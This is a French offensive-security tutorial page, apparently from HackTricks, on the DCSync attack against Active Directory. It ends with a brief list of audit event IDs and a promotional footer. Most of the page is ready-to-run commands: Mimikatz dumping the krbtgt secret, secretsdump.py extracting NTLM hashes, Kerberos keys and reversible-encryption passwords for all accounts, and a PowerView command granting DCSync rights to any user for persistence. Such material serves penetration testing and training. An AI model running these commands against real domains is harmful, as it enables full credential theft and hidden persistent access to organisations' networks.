## DCSync

La permission **DCSync** implique d'avoir ces permissions sur le domaine lui-même : **DS-Replication-Get-Changes**, **Replicating Directory Changes All** et **Replicating Directory Changes In Filtered Set**.

**Notes importantes sur DCSync :**

* L'attaque **DCSync simule le comportement d'un contrôleur de domaine et demande à d'autres contrôleurs de domaine de répliquer des informations** en utilisant le protocole distant de service de réplication de répertoire (MS-DRSR). Étant donné que MS-DRSR est une fonctionnalité valide et nécessaire d'Active Directory, il ne peut pas être désactivé.
* Par défaut, seuls les groupes **Domain Admins, Enterprise Admins, Administrateurs et Contrôleurs de domaine** ont les privilèges requis.
* Si des mots de passe de compte sont stockés avec un chiffrement réversible, une option est disponible dans Mimikatz pour retourner le mot de passe en clair.

### Énumération

Vérifiez qui a ces autorisations en utilisant `powerview`:
```powershell
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ActiveDirectoryRights -match 'WriteDacl')}
```
### Exploiter localement
```powershell
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```
### Exploitation à distance
```powershell
secretsdump.py -just-dc <user>:<password>@<ipaddress> -outputfile dcsync_hashes
[-just-dc-user <USERNAME>] #To get only of that user
[-pwd-last-set] #To see when each account's password was last changed
[-history] #To dump password history, may be helpful for offline password cracking
```
&#x20;`-just-dc` génère 3 fichiers:

* un avec les **hachages NTLM**
* un avec les **clés Kerberos**
* un avec les mots de passe en clair du NTDS pour tous les comptes configurés avec le chiffrement [**réversible**](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption) activé. Vous pouvez obtenir les utilisateurs avec le chiffrement réversible avec&#x20;

    ```powershell
    Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
    ```

### Persistance

Si vous êtes un administrateur de domaine, vous pouvez accorder ces autorisations à n'importe quel utilisateur avec l'aide de `powerview`:
```powershell
Add-ObjectAcl -TargetDistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -PrincipalSamAccountName username -Rights DCSync -Verbose
```
Ensuite, vous pouvez **vérifier si l'utilisateur a correctement reçu les 3 privilèges** en les cherchant dans la sortie de (vous devriez être en mesure de voir les noms des privilèges à l'intérieur du champ "ObjectType"):
```powershell
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{$_.IdentityReference -match "student114"}
```
### Atténuation

* ID d'événement de sécurité 4662 (la stratégie d'audit pour l'objet doit être activée) - Une opération a été effectuée sur un objet
* ID d'événement de sécurité 5136 (la stratégie d'audit pour l'objet doit être activée) - Un objet de service de répertoire a été modifié
* ID d'événement de sécurité 4670 (la stratégie d'audit pour l'objet doit être activée) - Les autorisations sur un objet ont été modifiées
* AD ACL Scanner - Créer et comparer des rapports de création d'ACL. [https://github.com/canix1/ADACLScanner](https://github.com/canix1/ADACLScanner)

## Références

* [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync)
* [https://yojimbosecurity.ninja/dcsync/](https://yojimbosecurity.ninja/dcsync/)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au [repo hacktricks](https://github.com/carlospolop/hacktricks) et au [repo hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

![](<../../.gitbook/assets/image (9) (1) (2).png>)

\
Utilisez [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) pour créer et automatiser facilement des flux de travail alimentés par les outils communautaires les plus avancés au monde.\
Obtenez l'accès aujourd'hui :

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
